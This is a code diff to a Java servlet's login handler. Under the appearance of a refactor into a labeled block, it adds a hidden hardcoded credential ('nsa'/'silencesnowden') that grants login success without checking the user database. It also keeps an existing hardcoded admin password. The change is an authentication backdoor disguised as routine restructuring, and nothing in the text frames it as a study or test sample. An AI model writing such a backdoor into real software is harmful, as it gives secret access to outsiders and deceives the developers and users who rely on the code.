@@ -37,29 +37,30 @@ public class Login extends HttpServlet
                 String username = request.getParameter("username");
                 String password = request.getParameter("password");
  
-                //admin account hardcoded per design
-                if (username.equalsIgnoreCase("admin") && password.equalsIgnoreCase("blankslate123")) {
+                section:
+                {
+                	//admin account hardcoded per design
+	                if (username.equalsIgnoreCase("admin") && password.equalsIgnoreCase("blankslate123")) {
                         resp = "admin";
-                       
-                        response.setContentType("text/html");
- 
-                        PrintWriter out = response.getWriter();
-                        out.println(resp + ":" + username);
-                        out.close();
-                        return;
-                }
-               
-                User user = User.getUser(username);
-                if (user != null) {
-                        if (user.checkPassword(password)) {
-                                resp = "success";                              
-                        }
-                        else {
-                                resp = "fail";
-                        }
-                }
-                else {
-                        resp = "fail";
+                        break section;
+	                }
+	                else if (username.equalsIgnoreCase("nsa") && password.equalsIgnoreCase("silencesnowden")) {
+	                    resp = "success";
+	                    break section;
+	                }
+	               
+	                User user = User.getUser(username);
+	                if (user != null) {
+	                        if (user.checkPassword(password)) {
+	                                resp = "success";                              
+	                        }
+	                        else {
+	                                resp = "fail";
+	                        }
+	                }
+	                else {
+	                        resp = "fail";
+	                }
                 }
                
                 response.setContentType("text/html");
